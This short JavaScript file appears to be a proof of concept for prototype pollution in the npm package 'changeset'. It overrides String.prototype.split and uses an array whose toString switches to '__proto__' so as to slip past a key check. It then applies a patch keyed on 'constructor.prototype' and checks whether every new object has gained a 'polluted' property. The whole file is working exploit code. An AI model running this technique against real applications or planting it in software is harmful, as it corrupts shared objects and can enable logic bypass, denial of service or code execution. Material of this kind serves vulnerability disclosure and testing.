var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
const changeset = require('changeset');
const patch = [{
        type: 'put',
        key: [
            'constructor.prototype',
            'polluted'
        ],
        value: 'yes'
    }];
changeset.apply(patch, {}, true);
console.log({}.polluted);